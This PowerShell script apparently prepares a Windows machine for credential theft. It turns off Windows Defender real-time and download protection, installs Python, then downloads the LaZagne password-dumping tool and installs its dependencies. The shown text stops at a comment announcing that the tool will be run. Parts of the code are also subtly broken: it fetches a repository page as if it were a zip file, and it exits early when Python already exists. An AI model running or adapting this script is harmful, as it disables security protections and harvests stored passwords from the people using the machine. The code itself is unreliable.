#Turning off AV
Write-Host "Turning off AV"
try{
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
}
catch{
        Write-Host "Error turning off AV make sure you are admin $_" 
}
# Install Python
# ----------------------------------------
#  Check if Python is already installed
# ----------------------------------------
try {
    $pythonVersion = python --version 2>$null
    if ($pythonVersion) {
        Write-Host "Python already installed: $pythonVersion"
        return
    }
} catch {}

Write-Host "Python not detected. Installing..."

# ----------------------------------------
# Try installing via winget (preferred)
# ----------------------------------------
# Check if winget exists
if (Get-Command winget -ErrorAction SilentlyContinue) {
    Write-Host "Winget detected — installing Python via winget..."

    # Use Start-Process to avoid quote/line parsing issues
    $wingetArgs = @(
        "install",
        "--id", "Python.Python.3",
        "-e",
        "--silent",
        "--accept-package-agreements",
        "--accept-source-agreements"
    )

    Start-Process -FilePath "winget.exe" -ArgumentList $wingetArgs -Wait

    # Verify installation
    try {
        $pythonVersion = python --version 2>$null
        if ($pythonVersion) {
            Write-Host "Python installed successfully via winget."
        } else {
            Write-Warning "Winget installation did not succeed. Will fallback to python.org installer."
        }
    } catch {
        Write-Warning "Winget installation failed. Will fallback to python.org installer."
    }
} else {
    Write-Host "Winget not available. Will install Python from python.org."
}
# ----------------------------------------
# Fallback: Install via python.org (auto-detect architecture)
# ----------------------------------------

# Determine architecture
$arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "win32" }

# Get latest stable version from the Python API
$latest = (Invoke-WebRequest "https://www.python.org/api/v2/downloads/release/?is_published=true" |
          ConvertFrom-Json).results | Sort-Object released_date -Descending | Select-Object -First 1

$version = $latest.name
$url = "https://www.python.org/ftp/python/$version/python-$version-$arch.exe"
$installer = Join-Path $env:TEMP "python-installer.exe"

Write-Host "Downloading Python $version for $arch..."
Invoke-WebRequest $url -OutFile $installer

Write-Host "Running silent installer..."
Start-Process $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait

Remove-Item $installer -Force -ErrorAction SilentlyContinue

try {
    $pythonVersion = python --version 2>&1
    Write-Host "Python installed successfully: $pythonVersion"
} catch {
    Write-Error "Python installation failed or PATH not updated."
}

#Install LaZagne
try{
Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne" -OutFile "LaZagne.zip"
$zipPath = Join-Path $PSScriptRoot "LaZagne.zip"
$destPath = Join-Path $PSScriptRoot "LaZagne"
Expand-Archive $zipPath -DestinationPath $destPath -Force
Remove-Item $zipPath
}
catch {
        Write-Host "Error Downloading LaZagne $_" -ForegroundColor Red
        }

# ---------------------------
# Set paths
# ---------------------------
# $destPath should point to the root of the extracted repo
$windowsFolder = Join-Path $destPath "Windows"
$pyScriptName = "laZagne.py"

# ---------------------------
# Find the Python script
# ---------------------------
$pyScript = Get-ChildItem -Path $windowsFolder -Filter $pyScriptName -File -ErrorAction SilentlyContinue |
            Select-Object -First 1

if ($null -eq $pyScript) {
    Write-Error "Python script '$pyScriptName' not found in the Windows folder!"
    return
}

Write-Host "Found Python script at $($pyScript.FullName)"

# ---------------------------
# Setup virtual environment
# ---------------------------
$venvPath = Join-Path $PSScriptRoot "venv"

if (-Not (Test-Path $venvPath)) {
    Write-Host "Creating virtual environment..."
    python -m venv $venvPath
} else {
    Write-Host "Virtual environment already exists."
}

# ---------------------------
# Activate virtual environment
# ---------------------------
$activateScript = Join-Path $venvPath "Scripts\Activate.ps1"
if (-Not (Test-Path $activateScript)) {
    Write-Error "Virtual environment activation script not found!"
    return
}

Write-Host "Activating virtual environment..."
. $activateScript

# ---------------------------
# Install requirements if present
# ---------------------------
$requirementsFile = Join-Path $windowsFolder "requirements.txt"
if (Test-Path $requirementsFile){
	Write-Host "Installing dependencies"
	pip install --upgrade pip 
	pip install -r $requirementsFile
}

# ---------------------------
# Run the Python script
# ---------------------------
